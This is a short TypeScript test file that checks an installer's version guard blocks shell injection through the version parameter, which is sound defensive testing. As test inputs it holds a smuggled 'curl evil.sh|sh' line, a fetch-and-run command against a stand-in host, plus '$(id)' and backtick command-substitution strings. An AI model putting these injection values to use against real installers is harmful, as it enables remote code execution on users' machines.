import { describe, expect, it } from 'bun:test';
import { renderInstaller } from './installer';
import { renderLoader } from './loader';
import { assertSafeInstallVersion } from './version-guard';

const INJECT = 'x\ncurl evil.sh|sh\n';

describe('installer version guard (no shell injection through ?version= / :version)', () => {
  it('accepts plain version tokens', () => {
    for (const v of ['latest', 'dev', '0.3.1', '1.2.3-rc.1+abc', 'v2_0']) expect(assertSafeInstallVersion(v)).toBe(v);
  });

  it('rejects newlines, spaces, quotes and shell metacharacters', () => {
    for (const v of [INJECT, 'a b', '1.0;id', '$(id)', '`id`', "1'", '', '-x', '../x', 'a'.repeat(65)]) {
      expect(() => assertSafeInstallVersion(v)).toThrow();
    }
  });

  it('the loader and installer refuse to render an injected version', () => {
    expect(() =>
      renderLoader({ controllerUrl: 'https://c.example', version: INJECT, installerSha256: 'ab'.repeat(32) }),
    ).toThrow();
    expect(() =>
      renderInstaller({
        controllerUrl: 'https://c.example',
        version: INJECT,
        agentImage: 'swarmy/agent:1',
        binaryBaseUrl: 'https://c.example/install/bin',
        binarySha256: {},
      }),
    ).toThrow();
    expect(renderLoader({ controllerUrl: 'https://c.example', version: '0.3.1', installerSha256: 'ab'.repeat(32) })).toContain(
      '/install/0.3.1/install.sh',
    );
  });
});
